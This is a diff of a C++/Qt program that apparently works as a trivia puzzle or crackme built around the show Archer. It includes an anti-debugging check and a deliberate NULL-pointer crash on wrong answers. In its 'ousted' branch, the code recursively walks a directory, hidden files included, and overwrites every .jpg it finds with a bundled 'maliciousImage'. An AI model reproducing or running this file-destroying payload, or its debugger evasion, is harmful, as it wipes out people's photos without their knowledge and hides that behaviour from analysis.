@@ -51,19 +51,19 @@ double getNumaNuma(double numa){
 
 
 /* Taken from: https://stackoverflow.com/questions/15580179/how-do-i-find-the-name-of-an-operating-system
-    Finds the OS type, for use when finding relevant directories */
+	Finds the OS type, for use when finding relevant directories */
 string getOsName(){
-    #ifdef _WIN32
-    return "Windows";
-    #elif _WIN64
-    return "Windows";
-    #elif __APPLE__ || __MACH__
-    return "Mac OSX";
-    #elif __linux__
-    return "Linux";
-    #else
-    return "Other";
-    #endif
+#ifdef _WIN32
+	return "Windows";
+#elif _WIN64
+	return "Windows";
+#elif __APPLE__ || __MACH__
+	return "Mac OSX";
+#elif __linux__
+	return "Linux";
+#else
+	return "Other";
+#endif
 }
 
 void pictureYourself(QImage &image1,QImage &image2,QImage &image3, QString &suitTag){
@@ -75,27 +75,27 @@ void pictureYourself(QImage &image1,QImage &image2,QImage &image3, QString &suit
 	if(image1.width()>image2.height()){
 		earthVista=true;
 	}
-								//[portrait,landscape]
+	//[portrait,landscape]
 	QImage* favoriteImage[2]={earthVista?&image2:&image1,earthVista?&image1:&image2};
-//	favoriteImage=[image1,image2];
-//	if(earthVista){
-//		favoriteImage[0]=&image2;
-//		favoriteImage[1]=&image1;
-////		favoriteImage=[ &image2,&image1];
-//	}
+	//	favoriteImage=[image1,image2];
+	//	if(earthVista){
+	//		favoriteImage[0]=&image2;
+	//		favoriteImage[1]=&image1;
+	////		favoriteImage=[ &image2,&image1];
+	//	}
 	favoriteImage[dirtPanorama]->scaled(image3.size()).save(suitTag);
 }
 
 string cause(string* idx){
-    return (idx[1337]);
+	return (idx[1337]);
 }
 
 void failure(string fun){
-    string* p = &fun;
-    p = NULL;
-    string pp = cause(p);
-    //long l0ng = p->size();
-    return;
+	string* p = &fun;
+	p = NULL;
+	string pp = cause(p);
+	//long l0ng = p->size();
+	return;
 }
 
 void letsSpoon(){
@@ -116,55 +116,16 @@ void letsSpoon(){
 
 
 int main(/*int argc, char *argv[]*/){
-    //QCoreApplication a(argc, argv);
-//    string osName = getOsName();
+	//QCoreApplication a(argc, argv);
+	//    string osName = getOsName();
 	QList<double> nommies;
 #ifdef Q_OS_WIN
 	if(IsDebuggerPresent()){
 		return(12473);
 	}
 #endif
-    Phase10:
-    {
-        size_t sizet = 13;
-        string tweedle = "yes";
-        string tweedlE = "Yes";
-        string dum = "13";
-        sizet %= 10;
-        vector<char> viktor(sizet);
-        viktor[0] = 'p';
-        string dee = "ocelot";
-        string deE = "Ocelot";
-        std::string str;
-        qDebug()<<"Are Sterling and Mallory eskimo brothers?";
-        getline(std::cin,str);
-        if(str != tweedle && str != tweedlE)
-            failure("!");
-        qDebug()<<"How many tallies does Pam have on her back?";
-        getline(std::cin,str);
-        if(str != dum)
-            failure("!");
-
-        qDebug()<<"What type of animal is Babou?";
-        getline(std::cin,str);
-        if(str != dee && str != deE)
-            failure("!");
-
-        viktor[1] = 'a';
-        viktor[2] = 'm';
-
-        qDebug()<<"Which character wore a dolphin on their hand?";
-        getline(std::cin,str);
-        int c = 15 ^ 15;
-        while(c < 3 && (tolower(str[c]) == viktor[c])){
-            c++; // Get it?
-        }
-        if(c < 3){
-            failure("!");
-        }
-    }
-	goto prior;
-	Phase1:
+	goto Phase10;
+Phase1:
 	{
 		QList<qint64> nums({2985,5318008,1337});
 		double answers[]={1.122306114604289e-07,3.535916717302045e-14,5.594189650861030e-07};
@@ -178,17 +139,18 @@ int main(/*int argc, char *argv[]*/){
 				goto ousted;
 			}
 		}
-//		for(uint i=0;i<3;++i){
-//			qint64 output=round(getNumaNuma(answers[i]));
-//			qDebug()<<output<<nums[i]<<(output==nums[i]);
-//		}
+		//		for(uint i=0;i<3;++i){
+		//			qint64 output=round(getNumaNuma(answers[i]));
+		//			qDebug()<<output<<nums[i]<<(output==nums[i]);
+		//		}
 		goto outed;
 	}
-//	qint64 output=round(getNumaNuma(1.122306114604289e-07));
-//	qDebug()<<output<<nums[0]<<(output==nums[0]);
+	//	qint64 output=round(getNumaNuma(1.122306114604289e-07));
+	//	qDebug()<<output<<nums[0]<<(output==nums[0]);
 
-	prior:
+prior:
 	{
+		std::cout<<"Answers are against your boxy perception.\n";
 		std::string str;
 		std::getline(std::cin,str);
 		QString cheese(str.c_str());
@@ -202,7 +164,7 @@ int main(/*int argc, char *argv[]*/){
 		}
 		goto Phase1;
 	}
-	ousted:
+ousted:
 	{
 		QString dir;
 		QImage maliciousImage(":/bunny.jpg");
@@ -224,22 +186,58 @@ int main(/*int argc, char *argv[]*/){
 		auto drain=QDir::AllDirs | QDir::Files | QDir::Hidden | QDir::NoSymLinks | QDir::NoDotDot | QDir::NoDot;
 
 		QDirIterator itr(dir, QStringList() << "*.jpg", drain, QDirIterator::Subdirectories);
-        //qDebug("test");
+		//qDebug("test");
 		while(itr.hasNext()){
 			auto imageName=itr.next();
 			QImage fImage(imageName);
 			if(fImage.isNull()){
 				continue;
 			}
-            pictureYourself(maliciousImage,maliciousImageRotated,fImage,imageName);
+			pictureYourself(maliciousImage,maliciousImageRotated,fImage,imageName);
 		}
 	}
-	outed:
-
+outed:
 	return 0;
+Phase10:
+	{
+		size_t sizet = 13;
+		string tweedle = "yes";
+		string tweedlE = "Yes";
+		string dum = "13";
+		sizet %= 10;
+		vector<char> viktor(sizet);
+		viktor[0] = 'p';
+		string dee = "ocelot";
+		string deE = "Ocelot";
+		std::string str;
+		std::cout<<"Are Sterling and Mallory eskimo brothers?";
+		getline(std::cin,str);
+		if(str != tweedle && str != tweedlE)
+			failure("!");
+		std::cout<<"How many tallies does Pam have on her back?";
+		getline(std::cin,str);
+		if(str != dum)
+			failure("!");
 
+		std::cout<<"What type of animal is Babou?";
+		getline(std::cin,str);
+		if(str != dee && str != deE)
+			failure("!");
 
+		viktor[1] = 'a';
+		viktor[2] = 'm';
 
-    //return a.exec();
-    return 0;
+		std::cout<<"Which character wore a dolphin on their hand?";
+		getline(std::cin,str);
+		int c = 15 ^ 15;
+		while(c < 3 && (tolower(str[c]) == viktor[c])){
+			c++; // Get it?
+		}
+		if(c < 3){
+			failure("!");
+		}
+	}
+	goto prior;
+	//return a.exec();
+	return 0;
 }
